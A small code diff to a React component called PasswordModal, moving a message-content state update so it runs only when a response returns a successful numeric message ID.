@@ -77,9 +77,8 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
             if (res?.data?.success && typeof res.data.message_id === 'number') {
                 setMessageId(res.data.message_id);
+                setMessageContent(updatedMessage);
             }
-
-            setMessageContent(updatedMessage);
 
             if (config.PASSWORD_LOADING_TIME) {
                 await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
